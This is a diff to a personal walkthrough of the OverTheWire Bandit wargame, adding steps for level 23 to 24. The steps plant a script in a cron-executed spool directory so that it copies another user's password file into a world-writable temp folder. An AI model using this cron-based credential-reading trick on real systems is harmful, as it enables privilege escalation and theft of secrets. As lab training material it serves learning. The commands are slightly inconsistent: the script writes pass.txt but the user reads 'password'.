@@ -497,7 +497,7 @@ exit
 ssh bandit22@bandit.labs.overthewire.org -p 2220
 ```
 
-### Level 22 >> Level 223
+### Level 22 >> Level 23
 
 ```bash
 # Like the previous leven we need analyze de /etc/cron.d/ jobs
@@ -517,4 +517,42 @@ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 # Now connected in bandit23
 exit
 ssh bandit23@bandit.labs.overthewire.org -p 2220
+```
+
+### Level 23 >> Level 24
+
+```bash
+# Like the previous leven we need analyze de /etc/cron.d/ jobs
+ls /etc/cron.d/
+cat /etc/cron.d/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+
+# apparently the script execute all into [/var/spool/bandit24]
+# so we can make an script to save the password in a temporal file
+mkdir /tmp/mrp4sten
+cd /tmp/mrp4sten
+touch script.sh
+chmod +x script.sh
+vim script.sh
+
+# the content from the script should be
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/mrp4sten/pass.txt
+
+# make file password
+touch password
+chmod o+w -R /tmp/mrp4sten
+
+# or
+chmod o+w /tmp/mrp4sten/password
+
+# copy into /var/spool/bandit24/foo
+cp script.sh /var/spool/bandit24/foo/
+
+# 1 minute after do
+cat password
+
+# Now connected in bandit24
+exit
+ssh bandit24@bandit.labs.overthewire.org -p 2220
 ```
